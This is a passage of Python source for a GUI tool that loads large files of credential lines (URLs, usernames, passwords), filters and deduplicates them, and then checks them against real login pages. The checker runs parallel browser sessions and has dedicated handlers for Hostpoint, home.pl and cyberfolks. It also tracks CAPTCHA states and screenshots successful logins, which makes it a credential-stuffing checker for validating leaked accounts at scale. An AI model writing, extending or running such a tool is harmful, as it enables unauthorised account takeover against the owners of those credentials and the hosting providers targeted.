        instead, status-filtered lookups apply it on top of the cached index."""
        return (
            self._domain_var.get().strip().lower(),
            self._url_keyword_var.get().strip().lower(),
            self._username_filter_var.get(),
        )

    def _invalidate_filter_cache(self):
        """Clear the filter cache.  Call when file changes or filters change."""
        self._filtered_index = None
        self._filter_cache_key = ()

    def _ensure_filter_cache(self, callback=None):
        """Ensure _filtered_index is up-to-date for the current filters.

        If the cache is already valid for the current filter key, calls
        callback() immediately (on the main thread).  Otherwise, launches a
        background thread to rebuild the cache, then calls callback() once done.

        callback receives no arguments; it is always called on the main thread.
        """
        key = self._get_filter_key()

        # Cache is still fresh — use it directly
        if self._filtered_index is not None and self._filter_cache_key == key:
            if callback:
                callback()
            return

        # A rebuild is already in flight — wait by queuing the callback.
        # Once the current build finishes we re-enter _ensure_filter_cache so
        # the fresh-cache check is performed against the (possibly new) key;
        # this avoids delivering a stale _filtered_index to the callback.
        if self._filter_cache_building:
            if callback:
                def _wait():
                    if self._filter_cache_building:
                        self.after(50, _wait)
                    else:
                        self._ensure_filter_cache(callback=callback)
                self.after(50, _wait)
            return

        # No index or no file → nothing to build
        if not self._filepath or not self._line_index:
            self._filtered_index = None
            self._filter_cache_key = key
            if callback:
                callback()
            return

        self._filter_cache_building = True
        filepath   = self._filepath
        index_snap = list(self._line_index)
        domain_kw  = key[0]
        url_kw     = key[1]
        username_mode = key[2]

        def _build():
            result: list[int] = []
            # If no filters are active, the cache is just all abs_idx values
            if not domain_kw and not url_kw and username_mode == "All":
                result = list(range(len(index_snap)))
            else:
                try:
                    total_snap = len(index_snap)
                    with open(filepath, "rb") as fb:
                        for abs_idx, offset in enumerate(index_snap):
                            fb.seek(offset)
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            e_url  = entry["url"].lower()
                            e_dom  = entry["domain"].lower()
                            e_user = entry["username"]
                            if domain_kw and domain_kw not in e_dom \
                                    and domain_kw not in e_url:
                                continue
                            if url_kw and url_kw not in e_url:
                                continue
                            if not self._username_matches_filter(e_user, username_mode):
                                continue
                            result.append(abs_idx)
                            # Update progress every 10 K scanned entries so the
                            # status bar moves even when few entries match.
                            if (abs_idx + 1) % 10_000 == 0:
                                scanned = abs_idx + 1
                                matched = len(result)
                                self.after(0, lambda s=scanned, m=matched, t=total_snap:
                                    self._statusbar.config(
                                        text=f"Filtering… {s:,}/{t:,} scanned, {m:,} matched"))
                except Exception:
                    result = []

            def _done():
                self._filtered_index     = result
                self._filter_cache_key   = key
                self._filter_cache_building = False
                if callback:
                    callback()

            self.after(0, _done)

        threading.Thread(target=_build, daemon=True).start()

    def _count_worker(
        self,
        path: str,
        dedup_enabled: bool = True,
        save_removed_list: bool = False,
    ):
        """
        Build a byte-offset index in ONE streaming pass using the fast
        _fast_host() pre-filter — ~10-15x faster than parse_credential_line().

        Reads in 8 MiB chunks for maximum disk throughput, tracks byte offsets
        manually so seek() can be used for O(1) page loads later.
        """
        CHUNK = 8 * 1024 * 1024   # 8 MiB read buffer
        focus = self._get_focus()  # snapshot — may be empty string
        index: list[int] = []
        seen:  set[tuple] = set() if dedup_enabled else set()
        count    = 0
        dupes    = 0
        leftover = b""
        offset   = 0   # byte position of start of current line
        removed_path = ""
        removed_fh = None

        if dedup_enabled and save_removed_list:
            base, _ = os.path.splitext(path)
            removed_path = f"{base}.removed.txt"
            try:
                removed_fh = open(removed_path, "wb")
            except Exception:
                removed_fh = None
                removed_path = ""
        try:
            with open(path, "rb") as fb:
                while True:
                    chunk = fb.read(CHUNK)
                    if not chunk:
                        # Process any remaining bytes as the last line
                        if leftover:
                            host = _fast_host(leftover)
                            if host is not None:
                                if not focus or focus in host:
                                    if dedup_enabled:
                                        key = _fast_dedup_key(leftover)
                                        if key is not None:
                                            if key not in seen:
                                                seen.add(key)
                                                index.append(offset)
                                                count += 1
                                            else:
                                                dupes += 1
                                            if removed_fh is not None:
                                                try:
                                                    removed_fh.write(leftover.rstrip(b"\r\n") + b"\n")
                                                except Exception:
                                                    pass
                                    else:
                                        index.append(offset)
                                        count += 1
                        break

                    # Split chunk into lines, preserving the terminator so we
                    # can compute exact byte lengths.
                    block   = leftover + chunk
                    lines   = block.split(b"\n")
                    # Last element is a partial line — carry it over
                    leftover = lines[-1]
                    lines    = lines[:-1]

                    for raw in lines:
                        line_len = len(raw) + 1   # +1 for the \n we stripped
                        raw_stripped = raw.rstrip(b"\r")
                        host = _fast_host(raw_stripped)
                        if host is not None:
                            if not focus or focus in host:
                                if dedup_enabled:
                                    key = _fast_dedup_key(raw_stripped)
                                    if key is not None:
                                        if key not in seen:
                                            seen.add(key)
                                            index.append(offset)
                                            count += 1
                                            if count % 100_000 == 0:
                                                self.after(0, lambda n=count: self._statusbar.config(
                                                    text=f"Indexing… {n:,} entries found so far"))
                                        else:
                                            dupes += 1
                                            if removed_fh is not None:
                                                try:
                                                    removed_fh.write(raw_stripped + b"\n")
                                                except Exception:
                                                    pass
                                else:
                                    index.append(offset)
                                    count += 1
                                    if count % 100_000 == 0:
                                        self.after(0, lambda n=count: self._statusbar.config(
                                            text=f"Indexing… {n:,} entries found so far"))
                        offset += line_len

        except Exception as exc:
            self.after(0, lambda e=exc: messagebox.showerror("Error", str(e)))
            if removed_fh is not None:
                try:
                    removed_fh.close()
                except Exception:
                    pass
            return
        finally:
            if removed_fh is not None:
                try:
                    removed_fh.close()
                except Exception:
                    pass

        if removed_path and dupes == 0:
            try:
                os.remove(removed_path)
                removed_path = ""
            except Exception:
                pass
        self.after(
            0,
            lambda idx=index, d=dupes, de=dedup_enabled, rp=removed_path:
                self._on_counted(path, idx, d, de, rp),
        )

    def _on_counted(
        self,
        path: str,
        index: list,
        dupes: int = 0,
        dedup_enabled: bool = True,
        removed_path: str = "",
    ):
        count = len(index)
        if count == 0:
            messagebox.showwarning("No entries",
                                   "No valid credential lines found in the file.")
            return
        self._line_index  = index
        self._total_lines = count
        self._invalidate_grouped_main_cache()
        # Warm filter cache for the default "no filter" state so status-only
        # searches and Save Dump can run immediately without a full rescan.
        self._filtered_index = list(range(count))
        self._filter_cache_key = self._get_filter_key()
        fname  = os.path.basename(path)
        focus  = self._get_focus()
        suffix = f" — domain: '{focus}'" if focus else ""
        self._file_var.set(f"  {fname}  ({count:,} entries{suffix})")
        self._var_total.set(f"Total: {count:,}")
        self._btn_check.config(state="normal")
        self._btn_clear.config(state="normal")
        self._btn_export.config(state="normal")
        self._btn_dump.config(state="normal")
        self._btn_unique_domains.config(state="normal")
        self._update_pager_label()
        self._load_page(0)
        if dedup_enabled and dupes > 0:
            msg = f"Loaded {count:,} entries — {dupes:,} duplicate(s) removed"
            if removed_path:
                msg += f" (saved: {os.path.basename(removed_path)})"
            self._statusbar.config(text=msg)
        elif not dedup_enabled:
            self._statusbar.config(
                text=f"Loaded {count:,} entries (duplicate removal disabled)"
            )

    def _stream_page(self, path: str, page: int) -> list[dict]:
        """
        Read only the rows belonging to *page* using the byte-offset index.
        Each entry is fetched with a single seek() + readline() — O(PAGE_SIZE)
        instead of O(file_size).
        """
        ordered_abs_idx = self._main_abs_index_order()
        start = page * PAGE_SIZE
        end   = min(start + PAGE_SIZE, len(ordered_abs_idx))
        rows: list[dict] = []
        if start >= end:
            return rows
        with open(path, "rb") as fb:
            for abs_idx in ordered_abs_idx[start:end]:
                if abs_idx < 0 or abs_idx >= len(self._line_index):
                    continue
                fb.seek(self._line_index[abs_idx])
                raw = fb.readline()
                line = raw.decode("utf-8", errors="ignore")
                entry = parse_credential_line(line)
                if entry is None:
                    continue
                entry["status"]   = self._results.get(abs_idx, "Pending")
                entry["_abs_idx"] = abs_idx
                rows.append(entry)
        return rows

    def _load_page(self, page: int):
        if self._filepath is None:
            return
        self._statusbar.config(text=f"Loading page {page + 1}...")
        self.update_idletasks()

        def _worker():
            rows = self._stream_page(self._filepath or "", page)
            self.after(0, lambda r=rows: self._on_page_loaded(page, r))

        threading.Thread(target=_worker, daemon=True).start()

    def _on_page_loaded(self, page: int, rows: list[dict]):
        self._page_index = page
        self._page_rows  = rows
        self._update_pager_label()
        self._populate_table_batched(rows)

    # ================================================================
    # Table population — batched inserts, UI stays responsive
    # ================================================================

    def _populate_table_batched(self, rows: list[dict], start: int = 0):
        # If a search is active, the tree belongs to the search results — don't
        # overwrite it with stale page-view rows from a pending after() batch.
        if self._search_results is not None:
            return
        if start == 0:
            self._tree.delete(*self._tree.get_children())

        end   = min(start + BATCH_INSERT, len(rows))
        for local_i in range(start, end):
            row     = rows[local_i]
            abs_idx = row.get("_abs_idx", local_i)
            tag_alt = "odd" if abs_idx % 2 else "even"
            tag_st  = self._status_tag(row["status"])
            ss_ind = "📷 View" if abs_idx in self._checker_screenshot_map else ""
            self._tree.insert(
                "", "end",
                iid=str(abs_idx),
                values=(abs_idx + 1, row["domain"], row["url"],
                        row["username"], row["password"], row["status"],
                        self._notes.get(abs_idx, ""), ss_ind),
                tags=(tag_alt, tag_st),
            )

        if end < len(rows):
            self.after(1, lambda: self._populate_table_batched(rows, end))
        else:
            total_pages = max(1, (self._total_lines + PAGE_SIZE - 1) // PAGE_SIZE)
            self._statusbar.config(
                text=f"Page {self._page_index + 1}/{total_pages} "
                     f"({len(rows)} rows)  —  {self._total_lines:,} total entries")
            self._update_pager_buttons()

    # ================================================================
    # Pager
    # ================================================================

    def _update_pager_label(self):
        total_pages = max(1, (self._total_lines + PAGE_SIZE - 1) // PAGE_SIZE)
        self._page_var.set(
            f"Page {self._page_index + 1} / {total_pages}  ({PAGE_SIZE} rows/page)")

    def _update_pager_buttons(self):
        total_pages = max(1, (self._total_lines + PAGE_SIZE - 1) // PAGE_SIZE)
        self._btn_prev.config(state="normal" if self._page_index > 0 else "disabled")
        self._btn_next.config(
            state="normal" if self._page_index < total_pages - 1 else "disabled")

    def _prev_page(self):
        if self._search_results is not None:
            if self._search_page > 0:
                self._search_page -= 1
                self._display_search_page()
            return
        if self._page_index > 0:
            self._load_page(self._page_index - 1)

    def _next_page(self):
        if self._search_results is not None:
            total_sp = max(1, (len(self._search_results) + PAGE_SIZE - 1) // PAGE_SIZE)
            if self._search_page < total_sp - 1:
                self._search_page += 1
                self._display_search_page()
            return
        total_pages = (self._total_lines + PAGE_SIZE - 1) // PAGE_SIZE
        if self._page_index < total_pages - 1:
            self._load_page(self._page_index + 1)

    def _goto_page(self):
        try:
            p = int(self._goto_var.get()) - 1
        except ValueError:
            return
        if self._search_results is not None:
            total_sp = max(1, (len(self._search_results) + PAGE_SIZE - 1) // PAGE_SIZE)
            self._search_page = max(0, min(p, total_sp - 1))
            self._display_search_page()
            return
        total_pages = (self._total_lines + PAGE_SIZE - 1) // PAGE_SIZE
        self._load_page(max(0, min(p, total_pages - 1)))

    # ================================================================
    # Search — live streaming: rows appear one-by-one as found
    # ================================================================

    def _do_search(self):
        if self._filepath is None:
            return

        domain     = self._domain_var.get().strip().lower()
        url_kw     = self._url_keyword_var.get().strip().lower()
        status_f   = self._status_filter.get()
        username_mode = self._username_filter_var.get()

        # Nothing active → restore normal page view
        if not domain and not url_kw and status_f == "All" and username_mode == "All":
            self._clear_search()
            return

        # Stop any previous search and cancel its poll timer
        self._search_stop_flag.set()
        if self._search_poll_id:
            self.after_cancel(self._search_poll_id)
            self._search_poll_id = None
        while not self._search_queue.empty():
            try:
                self._search_queue.get_nowait()
            except queue.Empty:
                break

        # Set _search_results to [] BEFORE clearing the tree so that any pending
        # _populate_table_batched after()-callbacks see a non-None _search_results
        # and bail out immediately, preventing stale page-view IID collisions.
        self._search_results = []
        self._search_page = 0
        self._tree.delete(*self._tree.get_children())

        self._btn_prev.config(state="disabled")
        self._btn_next.config(state="disabled")
        self._btn_search.config(state="disabled")
        self._btn_stop_search.config(state="normal")
        self._page_var.set("Searching…  0 matches")
        self._statusbar.config(text="Searching…")

        # Snapshot everything the worker needs (main-thread values)
        filepath   = self._filepath
        results    = self._results
        stop_flag  = self._search_stop_flag
        sq         = self._search_queue
        index_snap = list(self._line_index)
        sf         = status_f

        # Reuse the filter cache when current filters match, so we only
        # seek the already-filtered subset instead of the whole file.
        filter_key = (domain, url_kw, username_mode)
        if self._filtered_index is None or self._filter_cache_key != filter_key:
            self._statusbar.config(text="Preparing search index…")
            self._ensure_filter_cache(callback=self._do_search)
            return
        if (self._filtered_index is not None
                and self._filter_cache_key == filter_key):
            filtered_snap = list(self._filtered_index)
        else:
            filtered_snap = None

        def _worker():
            try:
                found = 0
                batch: list[dict] = []
                BATCH_SIZE = 250

                def _emit_batch():
                    if batch:
                        sq.put(("rows", list(batch)))
                        batch.clear()

                if filtered_snap is not None and index_snap:
                    # Ultra-fast: iterate pre-filtered abs_idx list only.
                    # Domain/url/email filters already applied — only status
                    # needs checking.
                    with open(filepath, "rb") as fb:
                        for abs_idx in filtered_snap:
                            if stop_flag.is_set():
                                sq.put(("stopped", None))
                                return
                            if abs_idx >= len(index_snap):
                                continue
                            fb.seek(index_snap[abs_idx])
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            entry["status"]   = results.get(abs_idx, "Pending")
                            entry["_abs_idx"] = abs_idx
                            if not self._status_matches_filter(entry["status"], sf):
                                continue
                            batch.append(entry)
                            found += 1
                            if len(batch) >= BATCH_SIZE:
                                _emit_batch()

                elif index_snap:
                    # Fast path: use the byte-offset index — seek directly to each line
                    with open(filepath, "rb") as fb:
                        for abs_idx, offset in enumerate(index_snap):
                            if stop_flag.is_set():
                                sq.put(("stopped", None))
                                return
                            fb.seek(offset)
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue

                            e_domain = entry["domain"].lower()
                            e_url    = entry["url"].lower()
                            e_user   = entry["username"]

                            if domain and domain not in e_domain and domain not in e_url:
                                continue
                            if url_kw and url_kw not in e_url:
                                continue
                            if not self._username_matches_filter(e_user, username_mode):
                                continue

                            entry["status"]   = results.get(abs_idx, "Pending")
                            entry["_abs_idx"] = abs_idx

                            if not self._status_matches_filter(entry["status"], sf):
                                continue

                            batch.append(entry)
                            found += 1
                            if len(batch) >= BATCH_SIZE:
                                _emit_batch()
                else:
                    # Fallback: no index yet — stream the whole file line by line
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        valid_idx = 0
                        for line in f:
                            if stop_flag.is_set():
                                sq.put(("stopped", None))
                                return
                            entry = parse_credential_line(line)
                            if entry is None:
                                continue

                            e_domain = entry["domain"].lower()
                            e_url    = entry["url"].lower()
                            e_user   = entry["username"]

                            if domain and domain not in e_domain and domain not in e_url:
                                valid_idx += 1
                                continue
                            if url_kw and url_kw not in e_url:
                                valid_idx += 1
                                continue
                            if not self._username_matches_filter(e_user, username_mode):
                                valid_idx += 1
                                continue

                            entry["status"]   = results.get(valid_idx, "Pending")
                            entry["_abs_idx"] = valid_idx

                            if not self._status_matches_filter(entry["status"], sf):
                                valid_idx += 1
                                continue

                            batch.append(entry)
                            found += 1
                            if len(batch) >= BATCH_SIZE:
                                _emit_batch()
                            valid_idx += 1
                _emit_batch()
                sq.put(("done", None))
            except Exception:
                # Always signal completion so _poll_search is never left hanging.
                sq.put(("error", None))

        # Drain the queue one more time (old worker may have added items after
        # the first drain above), then clear the flag and launch the new worker.
        while not self._search_queue.empty():
            try:
                self._search_queue.get_nowait()
            except queue.Empty:
                break
        self._search_stop_flag.clear()
        threading.Thread(target=_worker, daemon=True).start()
        self._search_poll_id = self.after(15, self._poll_search)

    def _stop_search(self):
        self._search_stop_flag.set()
        if self._search_poll_id:
            self.after_cancel(self._search_poll_id)
            self._search_poll_id = None
        self._btn_stop_search.config(state="disabled")
        self._btn_search.config(state="normal")
        n = len(self._search_results or [])
        total_pages = max(1, (n + PAGE_SIZE - 1) // PAGE_SIZE)
        self._search_page = 0
        self._page_var.set(
            f"Search stopped — {n:,} matches  (Page 1/{total_pages})")
        self._statusbar.config(text=f"Search stopped. {n:,} matches found.")
        self._btn_prev.config(state="disabled")
        self._btn_next.config(
            state="normal" if total_pages > 1 else "disabled")

    def _poll_search(self):
        """Drain up to 200 rows from the search queue and collect them.

        Only the first SEARCH_INITIAL_RENDER_LIMIT results are inserted into
        the Treeview during active search so first paint stays fast even when
        total matches are very large. Remaining results are stored in
        _search_results and accessible through paginated navigation.
        """
        BATCH = 200
        count = 0
        try:
            while count < BATCH:
                msg, entry = self._search_queue.get_nowait()

                if msg == "done":
                    if self._group_by_domain_var.get() and self._search_results:
                        self._search_results = self._group_entries_by_domain_stable(
                            self._search_results
                        )
                        self._tree.delete(*self._tree.get_children())
                        self._search_page = 0
                        self._display_search_page()
                    n = len(self._search_results or [])
                    self._search_page = 0
                    total_pages = max(1, (n + PAGE_SIZE - 1) // PAGE_SIZE)
                    self._page_var.set(
                        f"Search: Page 1/{total_pages}  ({n:,} matches)")
                    self._statusbar.config(
                        text=f"Search complete — {n:,} matches found.")
                    self._btn_stop_search.config(state="disabled")
                    self._btn_search.config(state="normal")
                    self._btn_prev.config(state="disabled")
                    self._btn_next.config(
                        state="normal" if total_pages > 1 else "disabled")
                    self._search_poll_id = None
                    return

                if msg == "stopped":
                    count += 1
                    continue

                if msg == "error":
                    n = len(self._search_results or [])
                    self._page_var.set(f"Search error — {n:,} partial matches")
                    self._statusbar.config(
                        text=f"Search ended with an error. {n:,} results shown.")
                    self._btn_stop_search.config(state="disabled")
                    self._btn_search.config(state="normal")
                    self._search_poll_id = None
                    return

                if msg == "rows" and entry is not None:
                    rows = entry if isinstance(entry, list) else [entry]
                    if self._search_results is None:
                        self._search_results = []

                    for row in rows:
                        self._search_results.append(row)
                        n = len(self._search_results)

                        # Keep initial render small while searching.
                        if n <= SEARCH_INITIAL_RENDER_LIMIT:
                            abs_idx = row.get("_abs_idx", n)
                            tag_alt = "odd" if abs_idx % 2 else "even"
                            tag_st  = self._status_tag(row["status"])
                            ss_ind = ("📷 View"
                                      if abs_idx in self._checker_screenshot_map
                                      else "")
                            try:
                                self._tree.insert(
                                    "", "end",
                                    iid=str(abs_idx),
                                    values=(abs_idx + 1, row["domain"],
                                            row["url"], row["username"],
                                            row["password"], row["status"],
                                            self._notes.get(abs_idx, ""),
                                            ss_ind),
                                    tags=(tag_alt, tag_st),
                                )
                            except tk.TclError:
                                pass

                    n = len(self._search_results)
                    if n % 500 == 0:
                        self._page_var.set(
                            f"Searching…  {n:,} matches so far")
                    count += 1

        except queue.Empty:
            pass

        self._search_poll_id = self.after(15, self._poll_search)

    def _display_search_page(self):
        """Render the current search-result page in the Treeview."""
        results = self._search_results or []
        page = self._search_page
        start = page * PAGE_SIZE
        end = min(start + PAGE_SIZE, len(results))
        total_pages = max(1, (len(results) + PAGE_SIZE - 1) // PAGE_SIZE)

        self._tree.delete(*self._tree.get_children())
        for i in range(start, end):
            entry = results[i]
            abs_idx = entry.get("_abs_idx", i)
            tag_alt = "odd" if abs_idx % 2 else "even"
            tag_st  = self._status_tag(entry["status"])
            ss_ind  = ("📷 View"
                       if abs_idx in self._checker_screenshot_map else "")
            try:
                self._tree.insert(
                    "", "end",
                    iid=str(abs_idx),
                    values=(abs_idx + 1, entry["domain"], entry["url"],
                            entry["username"], entry["password"],
                            entry["status"],
                            self._notes.get(abs_idx, ""), ss_ind),
                    tags=(tag_alt, tag_st),
                )
            except tk.TclError:
                pass

        self._page_var.set(
            f"Search: Page {page + 1}/{total_pages}  ({len(results):,} matches)")
        self._btn_prev.config(state="normal" if page > 0 else "disabled")
        self._btn_next.config(
            state="normal" if page < total_pages - 1 else "disabled")

    def _clear_search(self):
        # Stop any running search first
        self._search_stop_flag.set()
        if self._search_poll_id:
            self.after_cancel(self._search_poll_id)
            self._search_poll_id = None

        self._domain_var.set("")
        self._status_filter.set("All")
        self._url_keyword_var.set("")
        self._username_filter_var.set("All")
        self._search_results = None
        self._search_page = 0
        if self._filepath:
            self._load_page(self._page_index)

    # ================================================================
    # Login checking — streams file, checks in thread pool
    # ================================================================

    def _start_check(self):
        if self._checking or self._filepath is None:
            return
        self._stop_flag.clear()
        self._checking  = True
        self._done_jobs = 0
        self._total_jobs = self._total_lines   # will be refined once check starts
        self._cnt_ok = self._cnt_fail = self._cnt_unknown = 0
        self._consecutive_unreachable = 0
        self._auto_stop_unreachable_warned = False
        # Reset pause-aware timer
        self._check_start_time = time.monotonic()
        self._paused_seconds   = 0.0
        self._pause_started_at = None
        self._var_elapsed.set("")
        self._var_rate.set("")

        self._btn_check.config(state="disabled")
        self._btn_stop.config(state="normal")
        self._btn_pause.config(state="normal", text="⏸ Pause")
        self._btn_export.config(state="disabled")
        self._btn_dump.config(state="disabled")
        self._pause_flag.clear()   # ensure not paused on new run

        # Snapshot which row to start from (selected row, or beginning)
        sel = self._tree.selection()
        self._check_start_abs_idx = -1
        if sel:
            try:
                self._check_start_abs_idx = int(sel[0])
            except (ValueError, IndexError):
                self._check_start_abs_idx = -1

        # Snapshot filter values for the worker thread (thread-safe)
        self._check_domain_snap    = self._domain_var.get().strip().lower()
        self._check_url_kw_snap    = self._url_keyword_var.get().strip().lower()
        self._check_user_mode_snap = self._username_filter_var.get()
        self._check_status_snap    = self._status_filter.get()
        self._check_login_url_snap    = self._login_url_var.get().strip()
        self._check_success_url_snap  = self._success_url_var.get().strip()
        self._check_success_exact_snap = self._success_exact_var.get()
        self._check_success_dom_snap   = self._success_dom_var.get().strip()

        # Snapshot screenshot trigger setting and clear previous screenshots
        _val = self._screenshot_on_var.get()
        if _val == "SUCCESS":
            self._check_screenshot_on_snap: frozenset = frozenset({"SUCCESS"})
        elif _val == "FAILED":
            self._check_screenshot_on_snap = frozenset({"FAILED"})
        elif _val == "UNKNOWN":
            self._check_screenshot_on_snap = frozenset({"UNKNOWN"})
        elif _val == "CAPTCHA":
            self._check_screenshot_on_snap = frozenset({"CAPTCHA"})
        elif _val == "Both":
            self._check_screenshot_on_snap = frozenset({"SUCCESS", "FAILED"})
        elif _val == "All":
            self._check_screenshot_on_snap = frozenset({"SUCCESS", "FAILED", "UNKNOWN", "CAPTCHA"})
        else:
            self._check_screenshot_on_snap = frozenset()
        self._checker_screenshots.clear()
        self._checker_screenshot_map.clear()
        self._btn_view_screenshots.config(state="disabled")
        self._anti_captcha_alerted_messages.clear()

        # Show which filters are active
        parts = []
        if self._check_domain_snap:   parts.append(f"domain={self._check_domain_snap!r}")
        if self._check_url_kw_snap:   parts.append(f"url={self._check_url_kw_snap!r}")
        if self._check_user_mode_snap != "All":
            parts.append(f"user={self._check_user_mode_snap.lower()}")
        filter_desc = "  [" + ", ".join(parts) + "]" if parts else ""
        self._statusbar.config(text=f"Starting check{filter_desc}...")

        # Drain stale queue
        while not self._result_queue.empty():
            try:
                self._result_queue.get_nowait()
            except queue.Empty:
                break

        threading.Thread(target=self._check_worker, daemon=True).start()
        self._poll_queue()

    def _toggle_pause(self):
        """Pause or resume the running check."""
        if self._pause_flag.is_set():
            # Resuming — accumulate the time we were paused
            if self._pause_started_at is not None:
                self._paused_seconds += time.monotonic() - self._pause_started_at
                self._pause_started_at = None
            self._pause_flag.clear()
            self._btn_pause.config(text="⏸ Pause")
            self._statusbar.config(text="Checking resumed...")
        else:
            # Pausing — record when the pause began
            self._pause_started_at = time.monotonic()
            self._pause_flag.set()
            self._btn_pause.config(text="▶ Resume")
            self._statusbar.config(text="Checking paused — press Resume to continue.")

    def _get_screenshot_on(self) -> frozenset:
        """Read the current screenshot-trigger dropdown value and return the
        corresponding frozenset.  Safe to call from any thread."""
        _val = self._screenshot_on_var.get()
        if _val == "SUCCESS":
            return frozenset({"SUCCESS"})
        if _val == "FAILED":
            return frozenset({"FAILED"})
        if _val == "Both":
            return frozenset({"SUCCESS", "FAILED"})
        return frozenset()

    def _stop_check(self):
        self._stop_flag.set()
        self._pause_flag.clear()   # unblock any paused worker thread
        self._btn_stop.config(state="disabled")
        self._btn_pause.config(state="disabled", text="⏸ Pause")
        self._statusbar.config(text="Stopping...")

    def _check_worker(self):
        """
        Parallel checker — runs up to CONCURRENCY=5 browser sessions at the
        same time using a ThreadPoolExecutor.

        Each credential is submitted as a future; results are streamed back
        to the UI via self._result_queue as they complete.
        """
        try:
            filepath         = self._filepath or ""
            domain_snap      = getattr(self, "_check_domain_snap", "")
            url_kw_snap      = getattr(self, "_check_url_kw_snap", "")
            user_mode_snap   = getattr(self, "_check_user_mode_snap", "All")
            status_snap      = getattr(self, "_check_status_snap", "All")
            login_url_snap    = getattr(self, "_check_login_url_snap", "")
            success_url_snap  = getattr(self, "_check_success_url_snap", "")
            success_exact_snap = getattr(self, "_check_success_exact_snap", True)
            results_snap = dict(self._results)

            def _passes(entry: dict, status: str = "Pending") -> bool:
                if domain_snap and domain_snap not in entry["domain"].lower() \
                        and domain_snap not in entry["url"].lower():
                    return False
                if url_kw_snap and url_kw_snap not in entry["url"].lower():
                    return False
                if not self._username_matches_filter(entry["username"], user_mode_snap):
                    return False
                if not self._status_matches_filter(status, status_snap):
                    return False
                return True

            def _do_check(entry: dict) -> tuple[dict, str, bytes | None]:
                """Run in a worker thread — returns (entry, status, screenshot_bytes)."""
                print(f"[Info] Start Checking: {entry['domain']} / {entry['username']} / {entry['password']}")
                if self._stop_flag.is_set():
                    return entry, "Stopped", None
                # ── Pause support: block here until resumed or stopped ────
                while self._pause_flag.is_set():
                    if self._stop_flag.is_set():
                        return entry, "Stopped", None
                    time.sleep(0.3)
                if self._stop_flag.is_set():
                    return entry, "Stopped", None
                # Read screenshot setting fresh for every credential so that
                # changes made in the UI mid-run take effect immediately.
                screenshot_on_current = self._get_screenshot_on()
                screenshot = None
                def _on_captcha_state(state: str, stage: str) -> None:
                    self._result_queue.put(
                        ("update", entry["_abs_idx"], entry, f"CAPTCHA_STATE_{state}: {stage}")
                    )
                try:
                    entry_login_url = self._resolve_login_url_for_entry(
                        entry,
                        default_login_url=login_url_snap,
                    )
                    dom_cfg = self._resolve_dom_settings_for_entry(entry)
                    # ── Fast Hostpoint batch path ─────────────────────────
                    # Detect only from entry domain/url when no custom login URL is set.
                    # If user provides a custom login URL, force the normal
                    # visible flow (fast/interactive) instead of headless batch handlers.
                    domain_e = entry.get("domain", "").lower()
                    url_e    = entry.get("url", "").lower()
                    is_hp = (
                        (not entry_login_url and ("hostpoint" in domain_e or "hostpoint" in url_e))
                    )
                    # ── Fast home.pl batch path ───────────────────────────
                    is_homepl = (
                        (not entry_login_url and ("home.pl" in domain_e or "panel.home.pl" in url_e))
                    )
                    # ── Fast cyberfolks.pl batch path ─────────────────────
                    is_cyberfolks = (
                        (not entry_login_url and ("cyberfolks" in domain_e or "cyberfolks" in url_e))
                    )
                    if is_hp:
                        status, screenshot = try_login_hostpoint_batch(
                            entry, screenshot_on=screenshot_on_current)
                    elif is_homepl:
                        status, screenshot = try_login_home_pl_batch(
                            entry, screenshot_on=screenshot_on_current)
                    elif is_cyberfolks:
                        status, screenshot = try_login_cyberfolks_batch(
                            entry, screenshot_on=screenshot_on_current)
                    else:
                        # ── Fast Mode vs Interactive ──────────
                        if self._fast_mode_var.get():
                            status, screenshot = try_login_fast(
                                entry,
                                custom_login_url=entry_login_url,
                                custom_success_url=success_url_snap,
                                success_url_exact=success_exact_snap,
                                success_dom_selectors=self._success_dom_var.get().strip(),
                                delay=self._fast_delay_var.get(),
                                screenshot_on=screenshot_on_current,
                                custom_user_dom=dom_cfg["user"],
                                custom_pass_dom=dom_cfg["pass"],
                                custom_submit_dom=dom_cfg["submit"],
                                custom_logout_dom=dom_cfg["logout"],
                                custom_cookie_dom=dom_cfg["cookie"],
                                custom_login_trigger_dom=dom_cfg["login_trigger"],
                                custom_login_tab_dom=dom_cfg["login_tab"],
                                captcha_state_cb=_on_captcha_state,
                            )
                        else:
                            status, screenshot = try_login_interactive(
                                entry,
                                custom_login_url=entry_login_url,
                                custom_success_url=success_url_snap,
                                success_url_exact=success_exact_snap,
                                success_dom_selectors=self._success_dom_var.get().strip(),
                                screenshot_on=screenshot_on_current,
                                custom_user_dom=dom_cfg["user"],
                                custom_pass_dom=dom_cfg["pass"],
                                custom_submit_dom=dom_cfg["submit"],
                                custom_logout_dom=dom_cfg["logout"],
                                custom_cookie_dom=dom_cfg["cookie"],
                                custom_login_trigger_dom=dom_cfg["login_trigger"],
                                custom_login_tab_dom=dom_cfg["login_tab"],
                                captcha_state_cb=_on_captcha_state,
                            )
                except Exception as exc:
                    status = f"ERROR: {exc}"
                    screenshot = None
                if self._stop_flag.is_set():
                    status = "Stopped"
                    screenshot = None
                return entry, status, screenshot

            # ── Collect entries to check ──────────────────────────────────
            # Build list: file entries first, then manual entries.
            # If the user selected a row before clicking Check All,
            # skip all entries whose abs_idx is below that row.
            entries_to_check: list[dict] = []
            start_idx = getattr(self, "_check_start_abs_idx", -1)

            if filepath:
                index_snap_check = list(self._line_index)
                # Use filter cache when available — avoids re-scanning the entire
                # file and applying _passes() per line.  The cache already stores
                # abs_idx values that satisfy domain/url/email filters.
                filtered_snap_check = self._filtered_index \
                    if (self._filtered_index is not None
                        and self._filter_cache_key == self._get_filter_key()) \
                    else None

                if filtered_snap_check is not None and index_snap_check:
                    # Fast path: iterate cached abs_idx list and seek directly.
                    with open(filepath, "rb") as fb:
                        for abs_idx in filtered_snap_check:
                            if abs_idx >= len(index_snap_check):
                                continue
                            if start_idx >= 0 and abs_idx < start_idx:
                                continue
                            fb.seek(index_snap_check[abs_idx])
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            status = results_snap.get(abs_idx, "Pending")
                            if not _passes(entry, status):
                                continue
                            entry["_abs_idx"] = abs_idx
                            entries_to_check.append(entry)
                elif index_snap_check:
